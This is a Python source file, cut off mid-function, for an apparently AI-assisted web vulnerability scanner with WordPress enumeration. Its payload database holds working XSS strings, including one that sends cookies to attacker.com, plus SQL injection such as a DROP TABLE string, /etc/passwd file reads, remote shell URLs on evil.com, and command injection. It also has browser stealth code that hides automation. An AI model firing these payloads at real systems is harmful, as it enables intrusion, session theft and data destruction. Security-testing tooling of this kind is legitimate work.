#!/usr/bin/env python3
"""
🚀 ADVANCED INTELLIGENT WEB CRAWLER & AI PENETRATION TESTER
Next-generation autonomous security testing with AI-powered analysis
"""

import asyncio
import sys
import time
import random
import re
import json
import base64
import hashlib
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException, NoSuchElementException

# Conditional AI imports - only load when needed
try:
    from ai_policy import AIPolicy, ENABLE_AI
    AI_POLICY_AVAILABLE = True
except ImportError:
    AI_POLICY_AVAILABLE = False
    ENABLE_AI = False

# Conditional Stagehand integration
try:
    from stagehand_integration import StagehandWebCrawler, create_stagehand_crawler
    STAGEHAND_AVAILABLE = True
except ImportError:
    STAGEHAND_AVAILABLE = False

# Conditional Google AI import for backward compatibility
if ENABLE_AI:
    try:
        import google.generativeai as genai
    except ImportError:
        genai = None
else:
    genai = None

from dotenv import load_dotenv
import os
import requests
import subprocess
from pathlib import Path
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import logging
from rich.console import Console
from rich.table import Table
from rich.live import Live
from datetime import datetime

# Load environment variables
load_dotenv()

class AdvancedIntelligentCrawler:
    def __init__(self, log_to_file=False, log_file_path="crawler_live_log.jsonl", ai_analyzer=None):
        """Initialize the advanced intelligent crawler with AI capabilities"""
        self.target_url = None
        self.target_domain = None
        self.driver = None
        self.session = None
        
        # Advanced discovery tracking
        self.discovered_assets = {
            'pages': {},
            'forms': {},
            'inputs': {},
            'apis': {},
            'parameters': {},
            'cookies': {},
            'headers': {},
            'javascript': {},
            'technologies': set(),
            'vulnerabilities': {},
            'attack_vectors': {}
        }
        
        self.visited_urls = set()
        self.tested_payloads = set()
        self.session_data = {}
        
        # AI Configuration - use AI Policy if available
        self.ai_analyzer = ai_analyzer
        self.ai_model = ai_analyzer if ai_analyzer else None
        self.ai_enabled = bool(ai_analyzer) and ENABLE_AI
        
        # Initialize AI Policy for payload generation and analysis
        if AI_POLICY_AVAILABLE:
            self.ai_policy = AIPolicy(enable_ai=self.ai_enabled)
        else:
            self.ai_policy = None
        
        # Stagehand Integration - AI-powered browser automation (independent of AI Policy)
        self.stagehand_crawler = None
        self.use_stagehand = STAGEHAND_AVAILABLE  # Available regardless of AI policy setting
        
        # Advanced payloads database
        self.payload_database = self._initialize_payloads()
        
        # WordPress-specific detection patterns (from WPScan)
        self.wordpress_patterns = self._initialize_wordpress_patterns()
        
        print("🚀 ADVANCED INTELLIGENT WEB CRAWLER & PENETRATION TESTER")
        if self.ai_enabled:
            print("🤖 AI-powered autonomous security testing with comprehensive vulnerability detection")
        else:
            print("🔧 Comprehensive security testing with rule-based vulnerability detection")
        
        if self.use_stagehand:
            print("✨ Enhanced with Stagehand AI browser automation (works in any mode)")
        else:
            print("🔧 Using standard Selenium browser automation")
        
        # Advanced payloads database
        self.payload_database = self._initialize_payloads()
        
        # WordPress-specific detection patterns (from WPScan)
        self.wordpress_patterns = self._initialize_wordpress_patterns()
        
        print("🚀 ADVANCED INTELLIGENT WEB CRAWLER & PENETRATION TESTER")
        if self.ai_enabled:
            print("� AI-powered autonomous security testing with comprehensive vulnerability detection")
        else:
            print("🔧 Comprehensive security testing with advanced vulnerability detection")

        self.log_to_file = log_to_file
        self.log_file_path = log_file_path
        self.live_log = []
        
        # Initialize live console and table
        self.console = Console()
        self.live_table = self._create_live_table()

    def _extract_vulnerability_evidence(self, payload_type: str, page_source: str) -> str:
        """Extract evidence of vulnerability from page source"""
        if payload_type == 'sql_injection':
            sql_errors = [
                'SQL syntax', 'mysql_fetch', 'Warning: mysql', 'ORA-01756', 
                'Microsoft JET Database', 'ODBC Microsoft Access Driver',
                'PostgreSQL query failed', 'SQLite error', 'sqlite3.OperationalError'
            ]
            for error in sql_errors:
                if error.lower() in page_source.lower():
                    return f'SQL error detected: {error}'
            return 'SQL injection behavior detected (no explicit error message)'
        elif payload_type == 'xss':
            return 'JavaScript alert executed successfully'
        elif payload_type == 'command_injection':
            return 'Command execution evidence detected in response'
        return 'Vulnerability behavior confirmed'
    
    def _get_vulnerability_impact(self, payload_type: str) -> str:
        """Get the impact description for a vulnerability type"""
        impacts = {
            'sql_injection': 'Attacker can read, modify, or delete database data. May lead to full database compromise and server takeover.',
            'xss': 'Attacker can execute arbitrary JavaScript in victim\'s browser, steal cookies, session tokens, or perform actions on behalf of the user.',
            'command_injection': 'Attacker can execute arbitrary system commands on the server, potentially leading to full server compromise.',
            'directory_traversal': 'Attacker can read arbitrary files on the server, potentially exposing sensitive configuration files and data.'
        }
        return impacts.get(payload_type, 'Security vulnerability that may compromise application security')
    
    def _get_vulnerability_remediation(self, payload_type: str) -> str:
        """Get remediation description for vulnerability type"""
        remediations = {
            'sql_injection': 'Use parameterized queries (prepared statements) for all database operations',
            'xss': 'Implement proper input validation and context-aware output encoding',
            'command_injection': 'Avoid executing system commands with user input; use safe alternatives',
            'directory_traversal': 'Validate and sanitize file paths; use allowlists for permitted files'
        }
        return remediations.get(payload_type, 'Implement proper input validation and security controls')
    
    def _get_remediation_steps(self, payload_type: str) -> list:
        """Get detailed remediation steps for vulnerability type"""
        steps = {
            'sql_injection': [
                'Replace all dynamic SQL queries with parameterized queries',
                'Use stored procedures where appropriate',
                'Implement least privilege database access',
                'Enable SQL query logging and monitoring',
                'Regular security testing of database interactions'
            ],
            'xss': [
                'Validate and sanitize all user input on server side',
                'Use context-aware output encoding (HTML, JavaScript, URL)',
                'Implement Content Security Policy (CSP) headers',
                'Use secure frameworks that auto-escape output',
                'Regular XSS testing with various payloads'
            ],
            'command_injection': [
                'Avoid system command execution with user input',
                'Use safe APIs instead of shell commands',
                'Implement strict input validation and sanitization',
                'Use allowlists for permitted commands/parameters',
                'Run applications with minimal privileges'
            ]
        }
        return steps.get(payload_type, ['Implement security controls', 'Regular security testing'])
    
    def _generate_curl_command(self, form_action: str, form_method: str, payload: str) -> str:
        """Generate curl command for vulnerability reproduction"""
        if form_method.upper() == 'POST':
            return f'curl -X POST -d "input_field={payload}" "{form_action}"'
        else:
            return f'curl "{form_action}?input_field={payload}"'

    def _create_live_table(self):
        """Create a live table for logging events"""
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Time", style="dim", width=10)
        table.add_column("Type", style="cyan", no_wrap=True)
        table.add_column("Details", style="green")
        table.add_column("Status", style="yellow")
        return table

    def log_live_event(self, event_type: str, details: str, status: str = "In Progress"):
        """Add an event to the live table and optional file log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.live_table.add_row(timestamp, event_type, details, status)
        self.live_log.append({"timestamp": timestamp, "type": event_type, "details": details, "status": status})
        if self.log_to_file:
            logging.info(json.dumps(self.live_log[-1]))

    def _initialize_payloads(self):
        """Initialize comprehensive payload database"""
        return {
            'xss': [
                # Reflected XSS
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                
                # DOM-based XSS
                "#<script>alert('XSS')</script>",
                "<script>document.location='javascript:alert(\"XSS\")'</script>",
                
                # Stored XSS
                "<script>document.cookie='xss='+document.cookie;</script>",
                "<img src=x onerror=this.src='http://attacker.com/?'+document.cookie>",
                
                # Filter bypass
                "<scri<script>pt>alert('XSS')</scri</script>pt>",
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "'\"><script>alert('XSS')</script>",
                "';alert('XSS');//",
                "<%2Fscript%2F><%2Fscript>alert('XSS')<%2Fscript>",
            ],
            
            'sqli': [
                # Basic SQL injection
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "'; DROP TABLE users--",
                "' OR 'a'='a",
                
                # Time-based blind
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR (SELECT SLEEP(5))--",
                "'; SELECT pg_sleep(5)--",
                
                # Error-based
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' UNION SELECT 1,@@version,3--",
                
                # Boolean blind
                "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                "' AND LENGTH(DATABASE())>1--",
                
                # Authentication bypass
                "admin'--",
                "admin'/*",
                "' OR 1=1 LIMIT 1--",
            ],
            
            'lfi': [
                # Local file inclusion
                "../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "php://filter/convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "expect://whoami",
            ],
            
            'rfi': [
                # Remote file inclusion
                "http://evil.com/shell.txt",
                "https://pastebin.com/raw/malicious",
                "ftp://attacker.com/shell.php",
            ],
            
            'command_injection': [
                # Command injection
                "; ls -la",
                "| whoami",
                "& dir",
                "`id`",
                "$(whoami)",
                "; cat /etc/passwd",
                "| type C:\\windows\\system32\\drivers\\etc\\hosts",
                "&& echo vulnerable",
            ],
            
            'xxe': [
                # XML External Entity
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
            ],
            
            'ssti': [
                # Server-side template injection
                "{{7*7}}",
                "${7*7}",
                "<%=7*7%>",
                "{{config}}",
                "{{self.__class__.__mro__[2].__subclasses__()}}",
                "{%for c in [].__class__.__base__.__subclasses__()%}",
            ],
            
            'nosql': [
                # NoSQL injection
                "true, $where: '1 == 1'",
                ", $where: 'this.password.match(/.*/')",
                "[$ne]=1",
                "{'$gt': ''}",
                "[$regex]=.*",
            ],
            
            'ldap': [
                # LDAP injection
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "*))%00",
            ]
        }

    def _initialize_wordpress_patterns(self):
        """Initialize WordPress-specific detection patterns from WPScan"""
        return {
            'detection_patterns': {
                'wp_content': r'/(?:(?:wp-content/(?:themes|(?:mu-)?plugins|uploads))|wp-includes)/',
                'wp_json_oembed': r'/wp-json/oembed/',
                'wp_admin_ajax': r'/wp-admin/admin-ajax\.php',
                'meta_generator': r'<meta[^>]*name=["\']generator["\'][^>]*content=["\'][^"\']*wordpress[^"\']*["\']',
                'wp_hosted': r'https?://s\d\.wp\.com'
            },
            
            'common_files': [
                'wp-config.php', 'wp-config.php.bak', 'wp-config.txt',
                'wp-login.php', 'wp-admin/', 'wp-includes/',
                'wp-content/', 'wp-content/plugins/', 'wp-content/themes/',
                'wp-content/uploads/', 'wp-cron.php', 'xmlrpc.php',
                'readme.html', 'wp-links-opml.php', 'wp-signup.php'
            ],
            
            'version_indicators': {
                'rss_generator': r'<generator>https://wordpress\.org/\?v=([0-9.]+)</generator>',
                'atom_generator': r'<generator[^>]*version="([0-9.]+)"[^>]*>WordPress</generator>',
                'readme': r'Version ([0-9.]+)',
                'meta_generator': r'WordPress ([0-9.]+)',
                'script_version': r'ver=([0-9.]+)',
                'style_version': r'ver=([0-9.]+)'
            },
            
            'plugin_indicators': {
                'plugin_path': r'/wp-content/plugins/([^/]+)/',
                'plugin_readme': r'=== ([^=]+) ===.*?Stable tag: ([0-9.]+)',
                'plugin_header': r'Plugin Name: ([^\r\n]+).*?Version: ([0-9.]+)'
            },
            
            'theme_indicators': {
                'theme_path': r'/wp-content/themes/([^/]+)/',
                'style_css': r'Theme Name: ([^\r\n]+).*?Version: ([0-9.]+)',
                'theme_screenshot': r'/wp-content/themes/([^/]+)/screenshot\.(png|jpg|jpeg)'
            },
            
            'vulnerability_endpoints': [
                'wp-admin/admin-ajax.php',
                'wp-admin/admin-post.php', 
                'wp-json/', 'wp-json/wp/v2/',
                'index.php', '?rest_route=/',
                'wp-admin/options-general.php',
                'wp-admin/plugins.php',
                'wp-admin/themes.php'
            ],
            
            'interesting_files': [
                'wp-config.php~', '.wp-config.php.swp',
                'wp-config.php.save', 'wp-config.php.bak',
                'wp-config.php.tmp', 'backup-db.sql',
                'database.sql', 'db-backup.sql',
                'wp-content/debug.log',
                'wp-content/cache/',
                'wp-content/backups/',
                '.htaccess', 'robots.txt',
                'sitemap.xml', 'sitemap_index.xml'
            ]
        }

    async def setup_advanced_browser(self):
        """Setup advanced Chrome browser with stealth capabilities and optional Stagehand"""
        # Initialize Stagehand if available (works in both AI and no-AI modes)
        if self.use_stagehand:
            try:
                self.stagehand_crawler = await create_stagehand_crawler(
                    ai_policy=self.ai_policy,
                    headless=True,
                    screenshots_dir="screenshots"
                )
                print("✨ Stagehand AI browser automation initialized (independent of --no-ai flag)")
            except Exception as e:
                print(f"⚠️  Stagehand initialization failed: {e}")
                print("🔄 Falling back to standard Selenium automation")
                self.use_stagehand = False
        
        # Setup standard Selenium browser
        chrome_options = Options()
        
        # Stealth settings
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Security settings
        chrome_options.add_argument("--disable-web-security")
        chrome_options.add_argument("--disable-features=VizDisplayCompositor")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--no-sandbox")
        
        # Performance settings
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-plugins")
        
        # User agent spoofing
        chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        
        self.driver = webdriver.Chrome(options=chrome_options)
        
        # Execute stealth scripts
        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        self.driver.execute_script("Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})")
        self.driver.execute_script("Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})")
        
        # Setup HTTP session with better timeout handling
        self.session = requests.Session()
        retry_strategy = Retry(
            total=2,  # Reduced retries for faster scanning
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "OPTIONS"],
            backoff_factor=0.3  # Shorter backoff time
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Set default timeout for all requests
        self.default_timeout = 8  # Increased timeout to reduce errors
        
        # Suppress excessive urllib3 warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        # Log browser initialization event
        self.log_live_event("Browser Setup", "Advanced Chrome browser initialized with stealth capabilities", "Success")

    def _make_request_safe(self, method, url, **kwargs):
        """Make HTTP request with default timeout and error handling"""
        kwargs.setdefault('timeout', self.default_timeout)
        try:
            return self.session.request(method, url, **kwargs)
        except Exception as e:
            # Silently handle common network errors to reduce noise
            if any(err in str(e).lower() for err in ['timeout', 'connection', 'unreachable']):
                return None
            raise e

    async def ai_analyze_page(self, url, content, context="general"):
        """Use AI to analyze page content for vulnerabilities and insights"""
        if not self.ai_enabled or not self.ai_model:
            return {"analysis": "AI analysis disabled", "risk_score": 0, "recommendations": [], "vulnerabilities": [], "technologies": []}
        
        try:
            prompt = f"""
            Analyze this web page for security vulnerabilities and interesting features:
            
            URL: {url}
            Context: {context}
            Content Sample: {content[:2000]}...
            
            Please analyze for:
            1. Potential XSS vulnerabilities
            2. SQL injection points
            3. Authentication bypasses
            4. Information disclosure
            5. Business logic flaws
            6. Technologies and frameworks used
            7. Attack vectors and entry points
            
            Provide:
            - Risk score (0-10)
            - Specific vulnerabilities found
            - Recommended attack vectors to test
            - Technologies detected
            
            Format as JSON with fields: risk_score, vulnerabilities, recommendations, technologies
            """
            
            # Use new AIAnalyzer if available, otherwise fall back to old method
            if self.ai_analyzer:
                response = await asyncio.to_thread(
                    self.ai_analyzer.analyze_with_prompt, prompt
                )
                result_text = response.get('response', response.get('analysis', str(response)))
            else:
                # Fallback to old Gemini method
                response = await asyncio.to_thread(
                    self.ai_model.generate_content, prompt
                )
                result_text = response.text
            
            # Parse AI response
            try:
                result = json.loads(result_text)
                return result
            except:
                return {
                    "analysis": result_text,
                    "risk_score": 5,
                    "recommendations": ["Manual analysis recommended"]
                }
                
        except Exception as e:
            return {"analysis": f"AI analysis failed: {e}", "risk_score": 0, "recommendations": []}

    async def advanced_discovery(self, url):
        """Phase 1: Advanced intelligent feature discovery with AI analysis"""
        print("🔍 Phase 1: Advanced Intelligent Discovery...")
        print(f"  📡 Deep analysis of: {url}")
        
        try:
            self.driver.get(url)
            await asyncio.sleep(3)
            
            # Basic page info
            page_title = self.driver.title
            page_source = self.driver.page_source
            current_url = self.driver.current_url
            
            print(f"  📋 Page: {page_title}")
            print(f"  🌐 Final URL: {current_url}")
            
            # AI analysis of the page (if enabled)
            ai_analysis = await self.ai_analyze_page(url, page_source, "discovery")
            risk_score = ai_analysis.get('risk_score', 0)
            
            if self.ai_enabled:
                print(f"  🧠 AI Risk Score: {risk_score}/10")
            else:
                print(f"  📊 Standard Analysis: Page processed")
            
            # Technology detection
            await self._detect_technologies(page_source)
            
            # WordPress-specific detection and analysis
            await self._detect_wordpress(page_source, current_url)
            
            # Advanced link discovery
            await self._discover_advanced_links()
            
            # Form discovery with detailed analysis
            await self._discover_advanced_forms()
            
            # JavaScript analysis
            await self._analyze_javascript()
            
            # Cookie and session analysis
            await self._analyze_cookies_sessions()
            
            # Hidden parameter discovery
            await self._discover_hidden_parameters()
            
            # Store page data
            self.discovered_assets['pages'][url] = {
                'title': page_title,
                'content': page_source,
                'ai_analysis': ai_analysis,
                'timestamp': time.time()
            }
            
        except Exception as e:
            print(f"    ❌ Error in advanced discovery: {e}")

    async def _detect_technologies(self, page_source):
        """Detect technologies and frameworks"""
        print("  🔧 Technology Detection:")
        
        tech_patterns = {
            'PHP': r'\.php|<?php|PHP/',
            'ASP.NET': r'\.aspx|__VIEWSTATE|asp\.net',
            'JSP': r'\.jsp|<%=|<%@',
            'Node.js': r'Express|node\.js',
            'WordPress': r'wp-content|wp-includes|wordpress',
            'Drupal': r'drupal|/sites/default/',
            'Joomla': r'joomla|/components/',
            'React': r'react|ReactDOM',
            'Angular': r'angular|ng-app',
            'jQuery': r'jquery|jQuery',
            'Bootstrap': r'bootstrap',
            'MySQL': r'mysql|phpmyadmin',
            'PostgreSQL': r'postgresql|postgres',
            'MongoDB': r'mongodb|mongo',
            'Apache': r'apache|httpd',
            'Nginx': r'nginx',
            'IIS': r'iis|microsoft-iis'
        }
        
        detected = set()
        for tech, pattern in tech_patterns.items():
            if re.search(pattern, page_source, re.IGNORECASE):
                detected.add(tech)
                print(f"    • {tech} detected")
        
        self.discovered_assets['technologies'].update(detected)

    async def _detect_wordpress(self, page_source, current_url):
        """Advanced WordPress detection and analysis using WPScan techniques"""
        print("  🔍 WordPress Detection & Analysis:")
        
        is_wordpress = False
        wp_details = {
            'version': None,
            'plugins': [],
            'themes': [],
            'interesting_files': [],
            'vulnerabilities': []
        }
        
        # Pattern-based detection
        patterns = self.wordpress_patterns['detection_patterns']
        
        for pattern_name, pattern in patterns.items():
            if re.search(pattern, page_source, re.IGNORECASE):
                is_wordpress = True
                print(f"    ✅ WordPress detected via {pattern_name}")
                break
        
        if is_wordpress:
            self.discovered_assets['technologies'].add('WordPress')
            
            # Version detection
            wp_version = await self._detect_wp_version(page_source, current_url)
            if wp_version:
                wp_details['version'] = wp_version
                print(f"    📋 WordPress Version: {wp_version}")
            
            # Plugin enumeration
            plugins = await self._enumerate_wp_plugins(page_source)
            if plugins:
                wp_details['plugins'] = plugins
                print(f"    🔌 Found {len(plugins)} plugins")
                for plugin in plugins[:3]:  # Show first 3
                    print(f"      • {plugin['name']} ({plugin.get('version', 'unknown')})")
            
            # Theme detection
            themes = await self._enumerate_wp_themes(page_source)
            if themes:
                wp_details['themes'] = themes
                print(f"    🎨 Found {len(themes)} themes")
                for theme in themes[:2]:  # Show first 2
                    print(f"      • {theme['name']} ({theme.get('version', 'unknown')})")
            
            # Interesting files check
            interesting_files = await self._check_wp_interesting_files()
            if interesting_files:
                wp_details['interesting_files'] = interesting_files
                print(f"    📁 Found {len(interesting_files)} interesting files")
                for file_info in interesting_files[:3]:
                    print(f"      • {file_info['file']} ({file_info['status']})")
            
            # WordPress-specific vulnerability checks
            wp_vulns = await self._check_wp_vulnerabilities(wp_details)
            if wp_vulns:
                wp_details['vulnerabilities'] = wp_vulns
                print(f"    🚨 Found {len(wp_vulns)} WordPress vulnerabilities")
            
            self.discovered_assets['wordpress'] = wp_details
        else:
            print("    ❌ WordPress not detected")

    async def _detect_wp_version(self, page_source, current_url):
        """Detect WordPress version using multiple techniques"""
        version_patterns = self.wordpress_patterns['version_indicators']
        
        # Check page source for version indicators
        for indicator, pattern in version_patterns.items():
            match = re.search(pattern, page_source, re.IGNORECASE)
            if match:
                return match.group(1)
        
        # Check common WordPress files
        version_files = [
            'readme.html',
            'wp-includes/version.php',
            'feed/', '?feed=rss2', '?feed=atom'
        ]
        
        for file_path in version_files:
            try:
                response = await asyncio.to_thread(
                    self.session.get, f"{self.target_url.rstrip('/')}/{file_path.lstrip('/')}", 
                    timeout=5
                )
                
                if response.status_code == 200:
                    for pattern in version_patterns.values():
                        match = re.search(pattern, response.text, re.IGNORECASE)
                        if match:
                            return match.group(1)
            except Exception:
                continue
        
        return None

    async def _enumerate_wp_plugins(self, page_source):
        """Enumerate WordPress plugins using passive and active techniques"""
        plugins = []
        plugin_pattern = self.wordpress_patterns['plugin_indicators']['plugin_path']
        
        # Passive detection from page source
        plugin_matches = re.findall(plugin_pattern, page_source, re.IGNORECASE)
        unique_plugins = set(plugin_matches)
        
        for plugin_slug in unique_plugins:
            plugin_info = {
                'name': plugin_slug,
                'slug': plugin_slug,
                'version': None,
                'detected_by': 'passive_analysis'
            }
            
            # Try to get version from readme.txt
            try:
                readme_url = f"{self.target_url}/wp-content/plugins/{plugin_slug}/readme.txt"
                response = await asyncio.to_thread(
                    self.session.get, readme_url, timeout=5
                )
                
                if response.status_code == 200:
                    version_match = re.search(r'Stable tag: ([0-9.]+)', response.text, re.IGNORECASE)
                    if version_match:
                        plugin_info['version'] = version_match.group(1)
                        plugin_info['detected_by'] = 'readme_analysis'
            except Exception:
                pass
            
            plugins.append(plugin_info)
        
        # Active plugin enumeration (common plugins)
        common_plugins = [
            'akismet', 'jetpack', 'wordpress-seo', 'contact-form-7',
            'wp-super-cache', 'wordfence', 'elementor', 'woocommerce',
            'all-in-one-seo-pack', 'wp-optimize', 'updraftplus'
        ]
        
        for plugin_slug in common_plugins[:5]:  # Test first 5 to save time
            try:
                plugin_url = f"{self.target_url}/wp-content/plugins/{plugin_slug}/"
                response = await asyncio.to_thread(
                    self.session.head, plugin_url, timeout=3
                )
                
                if response.status_code in [200, 403]:  # Plugin exists
                    plugin_info = {
                        'name': plugin_slug,
                        'slug': plugin_slug,
                        'version': None,
                        'detected_by': 'directory_listing'
                    }
                    
                    # Avoid duplicates
                    if not any(p['slug'] == plugin_slug for p in plugins):
                        plugins.append(plugin_info)
            except Exception:
                continue
        
        return plugins

    async def _enumerate_wp_themes(self, page_source):
        """Enumerate WordPress themes"""
        themes = []
        theme_pattern = self.wordpress_patterns['theme_indicators']['theme_path']
        
        # Passive detection
        theme_matches = re.findall(theme_pattern, page_source, re.IGNORECASE)
        unique_themes = set(theme_matches)
        
        for theme_slug in unique_themes:
            theme_info = {
                'name': theme_slug,
                'slug': theme_slug,
                'version': None,
                'detected_by': 'passive_analysis'
            }
            
            # Try to get version from style.css
            try:
                style_url = f"{self.target_url}/wp-content/themes/{theme_slug}/style.css"
                response = await asyncio.to_thread(
                    self.session.get, style_url, timeout=5
                )
                
                if response.status_code == 200:
                    # Extract theme info from CSS header
                    header_match = re.search(
                        r'Theme Name:\s*([^\r\n]+).*?Version:\s*([0-9.]+)', 
                        response.text[:1000], 
                        re.IGNORECASE | re.DOTALL
                    )
                    if header_match:
                        theme_info['name'] = header_match.group(1).strip()
                        theme_info['version'] = header_match.group(2)
                        theme_info['detected_by'] = 'style_css_analysis'
            except Exception:
                pass
            
            themes.append(theme_info)
        
        return themes

    async def _check_wp_interesting_files(self):
        """Check for interesting WordPress files"""
        interesting_files = []
        files_to_check = self.wordpress_patterns['interesting_files']
        
        for file_path in files_to_check[:10]:  # Check first 10 to save time
            try:
                full_url = f"{self.target_url.rstrip('/')}/{file_path.lstrip('/')}"
                response = await asyncio.to_thread(
                    self.session.head, full_url, timeout=3
                )
                
                if response.status_code == 200:
                    file_info = {
                        'file': file_path,
                        'url': full_url,
                        'status': 'accessible',
                        'size': response.headers.get('content-length', 'unknown')
                    }
                    interesting_files.append(file_info)
                elif response.status_code == 403:
                    file_info = {
                        'file': file_path,
                        'url': full_url,
                        'status': 'forbidden',
                        'note': 'File exists but access denied'
                    }
                    interesting_files.append(file_info)
            except Exception:
                continue
        
        return interesting_files

    async def _check_wp_vulnerabilities(self, wp_details):
        """Check for common WordPress vulnerabilities"""
        vulnerabilities = []
        
        # Version-based vulnerabilities (simplified)
        if wp_details.get('version'):
            version = wp_details['version']
            detection_url = wp_details.get('detection_url', self.target_url)
            detection_method = wp_details.get('detection_method', 'unknown')
            
            # Some example version-based checks
            if version < '5.0':
                vuln_id = f"wp_outdated_{int(time.time())}"
                vulnerabilities.append({
                    'id': vuln_id,
                    'type': 'outdated_version',
                    'severity': 'high',
                    'description': f'WordPress {version} is significantly outdated',
                    'detected_version': version,
                    'vulnerable_url': detection_url,
                    'attack_vector': 'Version enumeration and known vulnerability exploitation',
                    'proof_of_concept': {
                        'description': f'WordPress version {version} detected with known vulnerabilities',
                        'detection_url': detection_url,
                        'detection_method': detection_method,
                        'evidence': f'WordPress version {version} confirmed via {detection_method}',
                        'impact': 'Multiple known vulnerabilities may be exploitable',
                        'verification_steps': [
                            f'1. Navigate to: {detection_url}',
                            f'2. Check page source for version indicators',
                            f'3. Look for generator meta tag, CSS/JS file versions',
                            f'4. Access /wp-includes/version.php if accessible'
                        ],
                        'curl_command': f'curl -s "{detection_url}" | grep -i "wp-includes\\|wp-content\\|generator"'
                    },
                    'remediation': {
                        'description': 'Update WordPress to the latest stable version',
                        'steps': [
                            'Backup your WordPress site completely',
                            'Update WordPress core to latest version',
                            'Update all plugins and themes',
                            'Test functionality after update',
                            'Remove version indicators from public view'
                        ]
                    },
                    'timestamp': datetime.now().isoformat(),
                    'confidence': 'high',
                    'recommendation': 'Update to latest WordPress version immediately'
                })
            
            if version < '4.7':
                vuln_id = f"wp_rest_api_{int(time.time())}"
                vulnerabilities.append({
                    'id': vuln_id,
                    'type': 'rest_api_exposure',
                    'severity': 'medium',
                    'description': 'WordPress REST API content exposure vulnerability',
                    'detected_version': version,
                    'vulnerable_url': f"{self.target_url.rstrip('/')}/wp-json/wp/v2/users",
                    'attack_vector': 'WordPress REST API user enumeration',
                    'proof_of_concept': {
                        'description': 'WordPress REST API exposes user information without authentication',
                        'api_endpoint': f"{self.target_url.rstrip('/')}/wp-json/wp/v2/users",
                        'evidence': f'WordPress {version} has vulnerable REST API implementation',
                        'impact': 'Exposes usernames and user IDs to unauthenticated users',
                        'verification_steps': [
                            f'1. Access: {self.target_url.rstrip("/")}/wp-json/wp/v2/users',
                            '2. Observe JSON response containing user information',
                            '3. Note exposed usernames and user IDs',
                            '4. Test other REST API endpoints for information disclosure'
                        ],
                        'curl_command': f'curl -s "{self.target_url.rstrip("/")}/wp-json/wp/v2/users" | python -m json.tool'
                    },
                    'remediation': {
                        'description': 'Update WordPress and configure REST API security',
                        'steps': [
                            'Update WordPress to version 4.7+ immediately',
                            'Use plugins to restrict REST API access',
                            'Implement authentication for sensitive endpoints',
                            'Monitor API access logs',
                            'Consider disabling REST API if not needed'
                        ]
                    },
                    'timestamp': datetime.now().isoformat(),
                    'confidence': 'high',
                    'recommendation': 'Update WordPress and review REST API security'
                })
        
        # Check for XMLRPC
        try:
            xmlrpc_url = f"{self.target_url.rstrip('/')}/xmlrpc.php"
            response = await asyncio.to_thread(
                self.session.get, xmlrpc_url, timeout=5
            )
            
            if response.status_code == 200 and 'XML-RPC' in response.text:
                vulnerabilities.append({
                    'type': 'xmlrpc_enabled',
                    'severity': 'medium',
                    'description': 'XML-RPC interface is enabled',
                    'recommendation': 'Disable XML-RPC if not needed'
                })
        except Exception:
            pass
        
        # Check for directory listing
        directories_to_check = ['wp-content/', 'wp-content/uploads/', 'wp-content/plugins/']
        
        for directory in directories_to_check:
            try:
                dir_url = f"{self.target_url.rstrip('/')}/{directory}"
                response = await asyncio.to_thread(
                    self.session.get, dir_url, timeout=3
                )
                
                if response.status_code == 200 and 'Index of' in response.text:
                    vulnerabilities.append({
                        'type': 'directory_listing',
                        'severity': 'low',
                        'description': f'Directory listing enabled: {directory}',
                        'recommendation': 'Disable directory listings'
                    })
            except Exception:
                continue
        
        return vulnerabilities

    async def _discover_advanced_links(self):
        """Advanced link discovery with categorization"""
        print("  🔗 Advanced Link Discovery:")
        
        links = self.driver.find_elements(By.TAG_NAME, "a")
        categorized_links = {
            'internal': [],
            'external': [],
            'suspicious': [],
            'admin': [],
            'api': []
        }
        
        for link in links:
            try:
                href = link.get_attribute("href")
